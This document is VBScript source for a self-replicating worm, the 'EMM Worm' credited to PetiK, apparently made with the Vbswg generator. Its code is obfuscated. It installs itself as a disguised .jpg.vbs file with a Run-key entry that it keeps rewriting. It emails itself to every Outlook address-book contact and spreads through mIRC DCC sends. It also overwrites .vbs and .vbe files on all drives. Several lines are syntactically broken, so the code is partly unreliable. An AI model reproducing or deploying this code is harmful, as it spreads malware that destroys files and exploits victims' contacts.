'Vbs.Vbswg.EMM Worm Created By PetiK. 10/27/2009
Set M56QQ929 = createobject("scripting.filesystemobject")
SU7653GU = M56QQ929.getspecialfolder(1)
OB6D3J4L = SU7653GU & "\emm.jpg.vbs"
Set S2389AOS = createobject("wscript.shell")
S2389AOS.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM", "wscript.exe " & OB6D3J4L & " %"
M56QQ929.copyfile wscript.scriptfullname, OB6D3J4L
H55UG9LN
If S2389AOS.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\LJTM7C8F") <> 1 then
M80O94BI
End if
If S2389AOS.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\JDQMFTF7") <> 1 then
JJP21JNP ""
End if
L5845128
Set U2U01E8O= M56QQ929.opentextfile(wscript.scriptfullname)
H78P8452 = U2U01E8O.readall
U2U01E8O.close
Do
if not(M56QQ929.fileexists(wscript.scriptfullname)) then
set LFJP41HH= M56QQ929.createtextfile(wscript.scriptfullname)
LFJP41HH.write H78P8452
LFJP41HH.close
end if
MS60D7A7 = S2389AOS.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM")
If MS60D7A7 <> "wscript.exe " & OB6D3J4L & " %" then
S2389AOS.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM", "wscript.exe " & OB6D3J4L & " %"
end if
MS60D7A7= ""
loop
Function M80O94BI()
Set I9388674 = CreateObject("Outlook.Application")
If I9388674 = "Outlook" Then
Set BL15AELL = I9388674.GetNameSpace("MAPI")
Set M5S3QG48 = BL15AELL.AddressLists
For Each UF6SEF86 In M5S3QG48
If UF6SEF86.AddressEntries.Count <> 0 Then
RH1C16N5 = UF6SEF86.AddressEntries.Count
For S895KH61 = 1 To RH1C16N5
Set H4735Q17 = I9388674.CreateItem(0)
Set ANO02A16 = UF6SEF86.AddressEntries(S895KH61)
H4735Q17.To = ANO02A16.Address
H4735Q17.Subject = "Very Important!"
H4735Q17.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set E8S19KB2 =H4735Q17." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
MA756QQ9 = OB6D3J4L
H4735Q17.DeleteAfterSubmit = True
E8S19KB2.Add MA756QQ9
If H4735Q17.To <> "" Then
H4735Q17.Send
End If
Next
End If
Next
End If
End function
Function JJP21JNP(J464E3FO)
If J464E3FO <> "" Then
J232389A = S2389AOS.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If M56QQ929.fileexists("c:\mirc\mirc.ini") Then
J464E3FO = "c:\mirc"
ElseIf M56QQ929.fileexists("c:\mirc32\mirc.ini") Then
J464E3FO = "c:\mirc32"
ElseIf M56QQ929.fileexists(J232389A & "\mirc\mirc.ini") Then
J464E3FO = J232389A & "\mirc"
ElseIf M56QQ929.fileexists(J232389A & "\mirc32\mirc.ini") Then
J464E3FO = J232389A & "\mirc"
Else
J464E3FO = ""
End If
End If
If J464E3FO <> "" Then
Set O13U7653 = M56QQ929.CreateTextFile(J464E3FO & "\script.ini", True)
O13U7653 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
O13U7653 = O13U7653 & vbCrLf & "n0=on 1:JOIN:#:{"
O13U7653 = O13U7653 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
O13U7653 = O13U7653 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
O13U7653 = O13U7653 & OB6D3J4L
O13U7653 = O13U7653 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function G60B6D3J()
On Error Resume Next
Set K4D55UG9 = M56QQ929.Drives
For Each L24JTM7C In K4D55UG9
HF180O94 = L24JTM7C & " \ "
Call BSIDQMFT(HF180O94)
Next
End Function

Function BSIDQMFT(FOMJP21J)
N342U01E = FOMJP21J
Set R1Q78P84 = M56QQ929.GetFolder(N342U01E)
Set RN1FJP41 = R1Q78P84.Files
For Each HQ8S60D7 In RN1FJP41
If lcase(HQ8S60D7.Name) = "mirc.ini" Then
JJP21JNP(HQ8S60D7.ParentFolder)
End If
If M56QQ929.GetExtensionName(HQ8S60D7.path) = "vbs"
M56QQ929.CopyFile wscript.scriptfullname,HQ8S60D7.path,true
End if
If M56QQ929.GetExtensionName(HQ8S60D7.path) = "vbe"
M56QQ929.CopyFile wscript.scriptfullname,HQ8S60D7.path,true
End if
Next
Set A4O93886 = R1Q78P84.Subfolders
For Each EIRL15AE In A4O93886
Call (EIRL15AE.path)
Next
End function
Function H55UG9LN()
Randomize
If 1 + Int(Rnd * 10) = 7 then
S2389AOS.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiK"
end if
end function
'Vbswg 2 Beta. By [K]
